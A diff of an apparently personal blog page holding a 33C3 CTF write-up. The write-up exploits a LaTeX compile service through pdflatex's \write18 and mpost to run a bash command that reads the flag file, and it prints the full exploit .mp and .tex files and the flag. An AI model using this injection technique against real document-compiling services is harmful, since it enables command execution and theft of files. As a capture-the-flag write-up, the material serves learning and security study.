@@ -312,35 +312,35 @@ nc 78.46.224.91 24242</p>
 
 <p>So this is a service that allow us to create, show &amp; compile some files.</p>
 <ul>
-  <li><code class="highlighter-rouge">create</code>: Create a file. Valid file format are: <code class="highlighter-rouge">.log</code>, <code class="highlighter-rouge">.tex</code>, <code class="highlighter-rouge">.mb</code>, <code class="highlighter-rouge">.sty</code> &amp; <code class="highlighter-rouge">.bib</code></li>
-  <li><code class="highlighter-rouge">show</code>: Show the file content.</li>
-  <li><code class="highlighter-rouge">compile</code>: Compile a file with the <code class="highlighter-rouge">pdflatex</code> command.</li>
+  <li><code class="language-plaintext highlighter-rouge">create</code>: Create a file. Valid file format are: <code class="language-plaintext highlighter-rouge">.log</code>, <code class="language-plaintext highlighter-rouge">.tex</code>, <code class="language-plaintext highlighter-rouge">.mb</code>, <code class="language-plaintext highlighter-rouge">.sty</code> &amp; <code class="language-plaintext highlighter-rouge">.bib</code></li>
+  <li><code class="language-plaintext highlighter-rouge">show</code>: Show the file content.</li>
+  <li><code class="language-plaintext highlighter-rouge">compile</code>: Compile a file with the <code class="language-plaintext highlighter-rouge">pdflatex</code> command.</li>
 </ul>
 
 <p>We started by googling the key word <strong>“pdflatex exploit”</strong>, then teammate <strong>mike</strong> found a useful link: <a href="http://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/">Pwning coworkers thanks to LaTeX</a></p>
 
 <p>Basically we just need to follow the method mentioned in the post:</p>
 <ol>
-  <li>Create a <code class="highlighter-rouge">.mp</code> file</li>
-  <li>Create a <code class="highlighter-rouge">.tex</code> file with the malicious content. Here we change the command to <code class="highlighter-rouge">(cat${IFS}$(ls|grep${IFS}33C3))&gt;qqq.log</code>, which will later store the flag content into <code class="highlighter-rouge">qqq.log</code></li>
-  <li>Compile the <code class="highlighter-rouge">.tex</code> file. This will cause <code class="highlighter-rouge">pdflatext</code> execute our command</li>
-  <li>Show the <code class="highlighter-rouge">qqq.log</code> file and get the flag</li>
+  <li>Create a <code class="language-plaintext highlighter-rouge">.mp</code> file</li>
+  <li>Create a <code class="language-plaintext highlighter-rouge">.tex</code> file with the malicious content. Here we change the command to <code class="language-plaintext highlighter-rouge">(cat${IFS}$(ls|grep${IFS}33C3))&gt;qqq.log</code>, which will later store the flag content into <code class="language-plaintext highlighter-rouge">qqq.log</code></li>
+  <li>Compile the <code class="language-plaintext highlighter-rouge">.tex</code> file. This will cause <code class="language-plaintext highlighter-rouge">pdflatext</code> execute our command</li>
+  <li>Show the <code class="language-plaintext highlighter-rouge">qqq.log</code> file and get the flag</li>
 </ol>
 
 <p>Here’s our final exploit:</p>
 
 <p>sss.mp:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>verbatimtex
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>verbatimtex
 \documentclass{minimal}\begin{document}
 etex beginfig (1) label(btex blah etex, origin);
 endfig; \end{document} bye
 </code></pre></div></div>
 
 <p>aaa.tex:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">\documentclass</span><span class="p">{</span>article<span class="p">}</span><span class="nt">\begin{document}</span>
-<span class="k">\immediate\write</span>18<span class="p">{</span>mpost -ini "-tex=bash -c (cat<span class="p">${</span><span class="nb">IFS</span><span class="p">}$</span>(ls|grep<span class="p">${</span><span class="nb">IFS</span><span class="p">}</span><span class="m">33</span><span class="nb">C</span><span class="m">3</span><span class="o">))</span><span class="nb">&gt;qqq.log" "sss.mp"</span><span class="p">}</span><span class="nb">
-</span><span class="nv">\end</span><span class="p">{</span><span class="nb">document</span><span class="p">}</span><span class="nb">
-</span></code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\documentclass{article}\begin{document}
+\immediate\write18{mpost -ini "-tex=bash -c (cat${IFS}$(ls|grep${IFS}33C3))&gt;qqq.log" "sss.mp"}
+\end{document}
+</code></pre></div></div>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
@@ -372,7 +372,7 @@ endfig; \end{document} bye
 
 <p><strong>Don’t take LaTEX files from strangers!!</strong></p>
 
-<p>flag: <code class="highlighter-rouge">33C3_pdflatex_1s_t0t4lly_s3cur3!</code></p>
+<p>flag: <code class="language-plaintext highlighter-rouge">33C3_pdflatex_1s_t0t4lly_s3cur3!</code></p>
 
         
       </section>
@@ -477,7 +477,6 @@ endfig; \end{document} bye
       <div class="grid__wrapper">
         
           
-          
 
 
 
@@ -497,7 +496,6 @@ endfig; \end{document} bye
 
         
           
-          
 
 
 
@@ -516,7 +514,6 @@ endfig; \end{document} bye
 </div>
 
         
-          
           
 
 
@@ -539,7 +536,6 @@ endfig; \end{document} bye
 
         
           
-          
 
 
 
@@ -560,6 +556,7 @@ endfig; \end{document} bye
         
       </div>
     </div>
+  
   
 </div>
 
@@ -610,7 +607,7 @@ endfig; \end{document} bye
   </ul>
 </div>
 
-<div class="page__footer-copyright">&copy; 2019 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+<div class="page__footer-copyright">&copy; 2020 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
 
       </footer>
     </div>
